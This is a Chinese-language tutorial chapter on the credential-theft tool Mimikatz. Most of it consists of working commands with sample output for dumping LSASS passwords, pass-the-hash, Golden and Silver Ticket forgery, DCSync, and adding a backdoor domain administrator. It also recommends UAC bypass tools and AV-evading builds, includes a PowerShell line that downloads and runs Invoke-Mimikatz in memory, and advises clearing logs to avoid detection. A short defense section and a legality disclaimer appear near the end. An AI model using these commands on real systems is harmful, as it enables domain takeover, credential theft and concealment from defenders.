# 第二十二章：Mimikatz - Windows凭证提取工具

## 22.1 Mimikatz 简介

### 什么是 Mimikatz？

想象一下，你进入了一个银行金库，里面有各种保险箱。每个保险箱都需要密码才能打开。但你发现了一个神奇的工具，它可以直接从保安的大脑中读取密码——不需要知道保险箱的密码，直接就能打开所有保险箱！

**Mimikatz**就是这样一个神奇的工具——它可以从Windows系统的内存中提取各种凭证信息，包括：
- 用户的明文密码
- 密码哈希值
- Kerberos票据
- 其他认证信息

简单来说，Mimikatz是一个**Windows凭证提取神器**，被称为"Windows安全界的瑞士军刀"。

### Mimikatz 的历史

Mimikatz最初是由法国安全研究员Benjamin Delpy（@gentilkiwi）开发的。最初只是一个简单的工具，用于演示Windows系统中的安全漏洞。但随着功能的不断扩展，Mimikatz逐渐成为了渗透测试中最常用的工具之一。

### Mimikatz 能做什么？

| 功能 | 说明 | 通俗理解 |
|------|------|----------|
| 提取明文密码 | 从内存中提取用户密码 | 直接读取密码 |
| 提取密码哈希 | 获取NTLM/LM哈希 | 获取钥匙的复印件 |
| Pass-the-Hash | 使用哈希进行认证 | 用复印件开门 |
| Pass-the-Ticket | 使用票据进行认证 | 使用通行证 |
| Golden Ticket | 创建伪造的TGT | 创建万能通行证 |
| Silver Ticket | 创建伪造的ST | 创建特定通行证 |
| DCSync | 同步域控制器数据 | 复制整个金库 |

### 为什么Mimikatz如此强大？

Mimikatz之所以强大，是因为它利用了Windows系统的几个"弱点"：

1. **LSASS进程存储凭证**：Windows的LSASS（Local Security Authority Subsystem Service）进程负责管理安全认证。当用户登录时，密码的哈希值甚至明文会存储在LSASS进程的内存中。

2. **Debug权限**：如果一个程序具有Debug权限，它可以读取其他进程的内存。Mimikatz就是利用这一点来读取LSASS进程的内存。

3. **内存中的明文密码**：在某些情况下，Windows会将用户的明文密码存储在内存中，而不仅仅是哈希值。这意味着Mimikatz可以直接获取明文密码！

---

## 22.2 安装教程

### 下载Mimikatz

Mimikatz有两个版本：

1. **官方版本**：https://github.com/gentilkiwi/mimikatz
2. **二进制版本**：可以从各种安全工具网站下载预编译的二进制文件

### 下载步骤

**步骤1：访问GitHub**

访问https://github.com/gentilkiwi/mimikatz

**步骤2：下载源代码或二进制文件**

- 如果想要自己编译，可以下载源代码
- 如果想要直接使用，可以下载预编译的二进制文件

**步骤3：解压文件**

将下载的文件解压到一个方便的位置，比如`C:\Tools\mimikatz`。

### 获取预编译版本

如果你不想自己编译，可以从以下渠道获取预编译版本：

- https://github.com/gentilkiwi/mimikatz/releases
- 各种安全工具集合（如Kali Linux、Parrot OS）

### 验证安装

打开命令提示符，进入Mimikatz目录：

```batch
cd C:\Tools\mimikatz
mimikatz.exe
```

如果看到如下输出，说明安装成功：

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2023 10:45:25
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 26 modules * * */
```

---

## 22.3 基础命令详解

### 启动Mimikatz

```batch
mimikatz.exe
```

进入Mimikatz交互式界面：

```
mimikatz #
```

### 退出Mimikatz

```
mimikatz # exit
```

或按`Ctrl+C`退出。

### 帮助命令

```
mimikatz # help
```

显示所有可用模块：

```
  mimikatz commands:
  ==================

  standard:
    * exit      - 退出 mimikatz
    * help      - 显示帮助信息
    * cls       - 清屏
    * version   - 显示版本信息
    * log       - 日志命令

  modules:
    * crypto    - 加密模块
    * sekurlsa  - 凭证提取模块
    * kerberos  - Kerberos模块
    * privilege - 权限模块
    * process   - 进程模块
    * service   - 服务模块
    * ts        - 终端服务模块
    * vault     - Windows Vault模块
    * dpapi     - DPAPI模块
```

### 查看模块帮助

```
mimikatz # sekurlsa::help
```

显示sekurlsa模块的所有命令。

---

## 22.4 权限提升详解

### 为什么需要权限提升？

Mimikatz需要管理员权限才能读取LSASS进程的内存。如果没有管理员权限，大部分功能将无法使用。

### 提升权限命令

```
mimikatz # privilege::debug
```

**输出示例：**

```
Privilege '20' OK
```

这表示Mimikatz成功获取了Debug权限。

### 权限提升失败的原因

如果权限提升失败，可能有以下原因：

1. **不是管理员**：当前用户不是管理员
2. **UAC阻止**：用户账户控制（UAC）阻止了权限提升
3. **安全软件阻止**：杀毒软件或EDR阻止了Mimikatz

### 绕过UAC

如果遇到UAC阻止，可以尝试以下方法：

**方法1：使用RunAs**

```batch
runas /user:administrator cmd
```

然后输入管理员密码，在新的命令提示符中运行Mimikatz。

**方法2：使用UAC绕过工具**

可以使用一些专门的UAC绕过工具，如：
- UACME
- PowerUp
- 其他UAC绕过脚本

---

## 22.5 密码提取详解

### sekurlsa模块

sekurlsa模块是Mimikatz最常用的模块，用于从LSASS进程中提取凭证。

### 提取所有密码

```
mimikatz # sekurlsa::logonpasswords
```

**输出示例：**

```
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : admin
Domain            : CORP
Logon Time        : 2024/01/01 10:00:00
SID               : S-1-5-21-xxx

        msv :
         [00000003] Primary
         * Username : admin
         * Domain   : CORP
         * NTLM     : d41d8cd98f00b204e9800998ecf8427e
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709

        kerberos :
         * Username : admin
         * Domain   : CORP.LOCAL
         * Password : Password123!

        wdigest :
         * Username : admin
         * Domain   : CORP
         * Password : Password123!

        tspkg :
         * Username : admin
         * Domain   : CORP
         * Password : (null)

        credman :
         * Username : admin
         * Domain   : CORP
         * Password : Password123!

        ssp :
         * Username : admin
         * Domain   : CORP
         * Password : Password123!

        cloudap :
         * Username : admin@corp.local
         * Domain   : CORP.LOCAL
         * Password : (null)
```

### 输出解读

| 字段 | 说明 |
|------|------|
| Authentication Id | 认证ID |
| Session | 会话类型（Interactive=交互式） |
| User Name | 用户名 |
| Domain | 域名 |
| Logon Time | 登录时间 |
| SID | 安全标识符 |

### 各种凭证类型

| 类型 | 说明 | 是否包含明文 |
|------|------|-------------|
| msv | MSV凭证（NTLM哈希） | 否 |
| kerberos | Kerberos凭证 | 可能包含 |
| wdigest | WDigest凭证 | 可能包含 |
| tspkg | TSPKG凭证 | 可能包含 |
| credman | 凭据管理器 | 可能包含 |
| ssp | 安全支持提供者 | 可能包含 |

### 只提取MSV凭证

```
mimikatz # sekurlsa::msv
```

只提取NTLM哈希，不提取其他凭证类型。

### 只提取Kerberos凭证

```
mimikatz # sekurlsa::kerberos
```

只提取Kerberos凭证，可能包含明文密码。

### 只提取WDigest凭证

```
mimikatz # sekurlsa::wdigest
```

只提取WDigest凭证，可能包含明文密码。

---

## 22.6 哈希利用详解

### 获取哈希值

从sekurlsa的输出中，我们可以获取NTLM哈希：

```
* NTLM     : d41d8cd98f00b204e9800998ecf8427e
```

### Pass-the-Hash攻击

Pass-the-Hash（传递哈希）是一种攻击方法，使用哈希值代替密码进行认证。

**通俗理解：**
就像你有一把钥匙的复印件，虽然不是真正的钥匙，但也能打开锁。

### 使用Mimikatz进行Pass-the-Hash

```
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:d41d8cd98f00b204e9800998ecf8427e
```

参数说明：
- `/user:admin`：用户名
- `/domain:corp.local`：域名
- `/ntlm:d41d8cd98f00b204e9800998ecf8427e`：NTLM哈希

**输出示例：**

```
user    : admin
domain  : corp.local
program : cmd.exe
impers. : no
token   : yes
parent  : yes

  * Process : C:\Windows\system32\cmd.exe
  * PID     : 12345
```

这会打开一个新的命令提示符窗口，使用admin用户的身份运行。

### 使用哈希访问共享文件夹

```
net use \\target.example.com\share /user:admin d41d8cd98f00b204e9800998ecf8427e /passwd:Hash
```

---

## 22.7 Kerberos票据操作详解

### 什么是Kerberos？

Kerberos是一种网络认证协议，用于在非安全网络环境中进行安全认证。

**通俗理解：**
就像你去游乐园，先在门口买一张门票（TGT），然后用这张门票去各个游乐设施（ST）。

### 提取Kerberos票据

```
mimikatz # sekurlsa::tickets /export
```

参数说明：
- `/export`：导出票据到文件

**输出示例：**

```
[00000000] - 2024/01/01 10:00:00
         UserName  : admin
         DomainName : CORP.LOCAL
         TargetName : krbtgt/CORP.LOCAL
         TicketType : krbtgt
         Base64     : ticket.kirbi
```

票据会保存为`.kirbi`文件。

### 导入Kerberos票据

```
mimikatz # kerberos::ptt ticket.kirbi
```

参数说明：
- `ticket.kirbi`：要导入的票据文件

**输出示例：**

```
Ticket successfully imported!
```

### 清除票据

```
mimikatz # kerberos::purge
```

清除当前会话中的所有Kerberos票据。

---

## 22.8 Golden Ticket详解

### 什么是Golden Ticket？

Golden Ticket是伪造的Kerberos TGT（Ticket Granting Ticket），可以访问域内的任何资源。

**通俗理解：**
就像一张万能门票，可以进入游乐园的所有区域，包括员工区域！

### 为什么Golden Ticket如此强大？

Golden Ticket伪造了域控制器（KRBTGT账户）签发的TGT，所以域内所有服务都会信任这张票据。拥有Golden Ticket的攻击者可以：

1. 访问域内任何资源
2. 创建域管理员账户
3. 修改域内任何配置
4. 持续保持对域的控制

### 创建Golden Ticket的条件

要创建Golden Ticket，需要以下信息：

1. **KRBTGT账户的NTLM哈希**：这是域控制器中KRBTGT账户的哈希值
2. **域SID**：域的安全标识符
3. **域名**：目标域的名称

### 获取KRBTGT哈希

```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

参数说明：
- `/inject`：注入LSASS进程
- `/name:krbtgt`：指定KRBTGT账户

**输出示例：**

```
RID  : 000001f4 (500)
User : krbtgt
  * Primary
    NTLM : a1b2c3d4e5f67890abcdef1234567890
```

### 获取域SID

```
mimikatz # lsadump::lsa /inject
```

在输出中找到域SID：

```
Domain : CORP.LOCAL (CORP)
SID    : S-1-5-21-1234567890-1234567890-1234567890
```

### 创建Golden Ticket

```
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f67890abcdef1234567890 /ptt
```

参数说明：
- `/user:Administrator`：伪造的用户名
- `/domain:corp.local`：域名
- `/sid:S-1-5-21-...`：域SID
- `/krbtgt:a1b2c3d4e5f67890abcdef1234567890`：KRBTGT哈希
- `/ptt`：直接导入票据（Pass The Ticket）

**输出示例：**

```
User      : Administrator
Domain    : corp.local (CORP)
SID       : S-1-5-21-1234567890-1234567890-1234567890
User-ID   : 500
Groups-ID : *513 512 520 518 519
Lifetime  : 2024/01/01 10:00:00 - 2025/01/01 10:00:00
-> Ticket : ticket.kirbi

 * PAC generated
 * Signed with KRBTGT key
 * Encrypted with KRBTGT key
 * Ticket saved to ticket.kirbi
 * Ticket successfully imported!
```

### 使用Golden Ticket

创建Golden Ticket后，你可以：

1. 访问域控制器：`dir \\dc.corp.local\c$`
2. 创建域管理员账户：`net user newadmin password123 /add /domain`
3. 将用户添加到域管理员组：`net group "Domain Admins" newadmin /add /domain`

---

## 22.9 Silver Ticket详解

### 什么是Silver Ticket？

Silver Ticket是伪造的Kerberos ST（Service Ticket），可以访问特定的服务。

**通俗理解：**
就像一张特定游乐设施的门票，只能进入那个设施，不能进入其他区域。

### Silver Ticket vs Golden Ticket

| 特点 | Silver Ticket | Golden Ticket |
|------|--------------|---------------|
| 范围 | 特定服务 | 整个域 |
| 需要的信息 | 服务账户哈希 | KRBTGT哈希 |
| 风险 | 较低 | 极高 |
| 检测难度 | 中等 | 较低 |

### 创建Silver Ticket

```
mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /target:sql.corp.local /service:MSSQLSVC /rc4:a1b2c3d4e5f67890abcdef1234567890 /ptt
```

参数说明：
- `/target:sql.corp.local`：目标服务器
- `/service:MSSQLSVC`：服务类型
- `/rc4:a1b2c3d4e5f67890abcdef1234567890`：服务账户的NTLM哈希

### 使用Silver Ticket

创建Silver Ticket后，你可以访问指定的服务：

```
sqlcmd -S sql.corp.local -E
```

---

## 22.10 DCSync攻击详解

### 什么是DCSync？

DCSync是一种攻击方法，允许攻击者从域控制器同步密码数据，而不需要物理访问域控制器。

**通俗理解：**
就像你可以复制整个金库的钥匙，而不需要进入金库！

### DCSync的原理

DCSync利用了Active Directory的复制功能。在正常情况下，域控制器之间会定期同步数据。攻击者可以利用这个机制，请求域控制器同步密码数据。

### 执行DCSync

```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

参数说明：
- `/domain:corp.local`：域名
- `/user:krbtgt`：要同步的用户（KRBTGT）

**输出示例：**

```
[DC] 'corp.local' will be the domain
[DC] 'dc.corp.local' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( ACCOUNTDISABLE )
Account expiration   :
Password last change : 2024/01/01 10:00:00
Object Security ID   : S-1-5-21-...-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a1b2c3d4e5f67890abcdef1234567890

    ntlm- 0: a1b2c3d4e5f67890abcdef1234567890
    lm  - 0: (null)
```

### DCSync的权限要求

要执行DCSync攻击，攻击者需要以下权限之一：

1. **Domain Admins**：域管理员
2. **Enterprise Admins**：企业管理员
3. **Replicating Directory Changes**：复制目录更改权限
4. **Replicating Directory Changes All**：复制目录更改所有权限

---

## 22.11 实战案例：域内凭证提取

### 场景说明

你已经获得了一台域内Windows主机的管理员权限，现在想要提取域管理员的凭证。

### 步骤1：启动Mimikatz

```batch
mimikatz.exe
```

### 步骤2：提升权限

```
mimikatz # privilege::debug
```

确认输出显示"Privilege '20' OK"。

### 步骤3：提取所有凭证

```
mimikatz # sekurlsa::logonpasswords
```

查看输出，寻找域管理员的凭证。

### 步骤4：获取NTLM哈希

从输出中找到域管理员的NTLM哈希：

```
* NTLM     : d41d8cd98f00b204e9800998ecf8427e
```

### 步骤5：Pass-the-Hash

使用哈希访问域控制器：

```
mimikatz # sekurlsa::pth /user:domainadmin /domain:corp.local /ntlm:d41d8cd98f00b204e9800998ecf8427e
```

### 步骤6：访问域控制器

在新打开的命令提示符中：

```batch
dir \\dc.corp.local\c$
```

如果成功列出目录，说明Pass-the-Hash成功！

---

## 22.12 实战案例：Golden Ticket攻击

### 场景说明

你已经获得了域控制器的权限，现在想要创建Golden Ticket，实现持久化控制。

### 步骤1：获取KRBTGT哈希

```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

记录KRBTGT的NTLM哈希：`a1b2c3d4e5f67890abcdef1234567890`

### 步骤2：获取域SID

```
mimikatz # lsadump::lsa /inject
```

记录域SID：`S-1-5-21-1234567890-1234567890-1234567890`

### 步骤3：创建Golden Ticket

```
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f67890abcdef1234567890 /ptt
```

### 步骤4：验证Golden Ticket

```batch
dir \\dc.corp.local\c$
net user newadmin password123 /add /domain
net group "Domain Admins" newadmin /add /domain
```

---

## 22.13 防御方法详解

### 方法1：限制本地管理员权限

确保只有必要的用户拥有本地管理员权限。

### 方法2：启用LSASS保护

**Windows 10/11：**

1. 打开组策略编辑器：`gpedit.msc`
2. 导航到：计算机配置 → 管理模板 → 系统 → 凭据分配
3. 双击"配置LSASS以作为受保护的进程运行"
4. 选择"已启用"
5. 在下拉菜单中选择"仅运行受保护的进程"
6. 点击"确定"

### 方法3：禁用WDigest

**Windows 10/11：**

1. 打开注册表编辑器：`regedit`
2. 导航到：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`
3. 创建或修改`UseLogonCredential`值为`0`

### 方法4：监控LSASS进程

使用EDR或其他安全工具监控LSASS进程的异常访问。

### 方法5：启用Kerberos AES加密

确保Kerberos使用AES加密，而不是RC4。

### 方法6：定期更换KRBTGT密码

定期更换KRBTGT账户的密码，这样即使哈希泄露，也会失效。

---

## 22.14 常见问题与解决方案

### 问题1：权限提升失败

**可能原因：**
- 当前用户不是管理员
- UAC阻止了权限提升

**解决方案：**
- 使用管理员账户运行
- 使用UAC绕过工具

### 问题2：无法提取密码

**可能原因：**
- 目标系统启用了LSASS保护
- 目标系统禁用了WDigest
- 安全软件阻止了Mimikatz

**解决方案：**
- 使用其他方法获取凭证
- 尝试绕过LSASS保护

### 问题3：Pass-the-Hash失败

**可能原因：**
- 目标系统启用了SMB签名
- 目标系统禁用了NTLM认证
- 哈希值错误

**解决方案：**
- 确认哈希值正确
- 使用其他认证方法

### 问题4：Golden Ticket创建失败

**可能原因：**
- KRBTGT哈希错误
- 域SID错误
- 权限不足

**解决方案：**
- 确认KRBTGT哈希和域SID正确
- 确保具有域管理员权限

---

## 22.15 注意事项与最佳实践

### 合法使用

Mimikatz是一个强大的工具，但必须在合法授权的情况下使用！未经授权提取他人的凭证是违法行为。

### 检测与规避

Mimikatz很容易被杀毒软件和EDR检测到。在实际渗透测试中，可能需要：

1. 使用免杀版本的Mimikatz
2. 使用PowerShell版本（Invoke-Mimikatz）
3. 使用其他工具替代

### PowerShell版本

可以使用PowerShell版本的Mimikatz，避免直接运行可执行文件：

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### 日志清理

在使用Mimikatz后，记得清理相关日志，避免被检测到。

---

## 总结

本章详细介绍了Mimikatz的使用：

1. **原理详解**：Windows凭证存储机制，用"银行金库"的比喻解释清楚
2. **安装配置**：下载和使用方法
3. **基础命令**：启动、退出、帮助命令
4. **权限提升**：获取Debug权限
5. **密码提取**：sekurlsa模块详解，各种凭证类型
6. **哈希利用**：Pass-the-Hash攻击
7. **Kerberos操作**：票据提取、导入、清除
8. **Golden Ticket**：创建和使用万能票据
9. **Silver Ticket**：创建特定服务票据
10. **DCSync**：同步域控制器数据
11. **实战案例**：域内凭证提取、Golden Ticket攻击
12. **防御方法**：LSASS保护、WDigest禁用等
13. **常见问题**：解决各种使用问题

Mimikatz是Windows域渗透的核心工具，掌握它能够帮助你在域环境中获取和利用凭证。

下一章我们将学习BloodHound——域环境分析工具！